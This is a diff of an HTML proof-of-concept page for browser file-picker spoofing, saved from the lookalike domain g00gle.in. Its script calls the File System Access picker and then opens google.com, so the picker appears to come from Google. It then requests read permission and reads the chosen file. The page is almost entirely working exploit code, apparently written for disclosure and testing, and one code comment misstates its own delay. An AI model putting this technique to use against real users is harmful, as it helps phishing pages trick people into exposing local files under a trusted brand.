@@ -1,48 +1,69 @@
 <!-- saved from url=(0035)https://g00gle.in/chromepicker.html -->
 <html class="hydrated">
-<head>
-  <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
-  <title>PoC - File Picker Spoofing</title>
-</head>
-<body align="center" style="color: red; font-size: 24px; font-family: sans-serif;">
-  <div onclick="handleClick()" style="cursor: pointer; padding: 20px; border: 2px solid red; display: inline-block;">
-    📸 Click Here to Upload to Google
-  </div>
-  <p style="font-size: 14px; color: #333;">(A new tab will open google.com, then file picker will appear)</p>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252" />
+    <style type="text/css" id="operaUserStyle"></style>
+    <script
+      src="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-email-notifier/sqrx-email-notifier.esm.js"
+      type="module"
+      data-resources-url="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-email-notifier/"
+      data-stencil-namespace="sqrx-email-notifier"
+      id="sqrx-email-notifier"
+    ></script>
+    <script
+      src="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-dialog/sqrx-dialog.esm.js"
+      type="module"
+      data-resources-url="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-dialog/"
+      data-stencil-namespace="sqrx-dialog"
+      id="sqrx-dialog"
+    ></script>
+    <script
+      src="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-notification-bar/sqrx-notification-bar.esm.js"
+      type="module"
+      data-resources-url="chrome-extension://kapjaoifikajdcdehfdlmojlepfpkpoe/sqrx-notification-bar/"
+      data-stencil-namespace="sqrx-notification-bar"
+      id="sqrx-notification-bar"
+    ></script>
+  </head>
+  <body align="center" onclick="load()" style="color: red; font-size: 24px">
+    Click Here
 
-  <script>
-    async function handleClick() {
-      // 1. Buka tab baru dengan Google
-      window.open("https://www.google.com", "_blank");
+    <script>
+      async function load() {
+        window.handle = window.showOpenFilePicker();
+        window.open("https://google.com", "_blank");
+        window.handle = (await window.handle)[0];
+        await window.handle.requestPermission();
+        // ...
+        previewImage();
+      }
 
-      // 2. Beri jeda 500ms agar tab Google sempat terbuka dan menjadi foreground
-      setTimeout(async () => {
-        try {
-          // Tampilkan file picker (pilih file)
-          const [fileHandle] = await window.showOpenFilePicker();
-          // Minta izin baca file (jika diperlukan)
-          await fileHandle.requestPermission({ mode: 'read' });
-          const file = await fileHandle.getFile();
-
-          // Preview gambar jika file adalah image
-          if (file.type.startsWith("image/")) {
-            const reader = new FileReader();
-            reader.onload = function (event) {
-              const imgElement = document.createElement("img");
-              imgElement.src = event.target.result;
-              imgElement.style.maxWidth = "300px";
-              imgElement.style.marginTop = "20px";
-              document.body.appendChild(imgElement);
-            };
-            reader.readAsDataURL(file);
-          } else {
-            alert("Selected file is not an image. Please choose an image.");
-          }
-        } catch (err) {
-          console.log("User cancelled or error:", err);
+      async function previewImage() {
+        const file = await window.handle.getFile();
+        if (file.type.startsWith("image/")) {
+          const reader = new FileReader();
+          reader.onload = function (event) {
+            const imgElement = document.createElement("img");
+            imgElement.src = event.target.result;
+            document.body.appendChild(imgElement);
+          };
+          reader.readAsDataURL(file);
+        } else {
+          alert("Please choose an image file.");
         }
-      }, 3000); // jeda 500ms (bisa disesuaikan)
-    }
-  </script>
-</body>
+      }
+    </script>
+
+    <div id="sqrx-content-container">
+      <div class="squarex_ext_modal">
+        <div class="squarex_ext_dialog-container">
+          <div id="module_dialog_root__disposableFileViewer">
+            <div
+              class="squarex_ext_dialog squarex_ext_light squarex_ext__hidden"
+            ></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </body>
 </html>
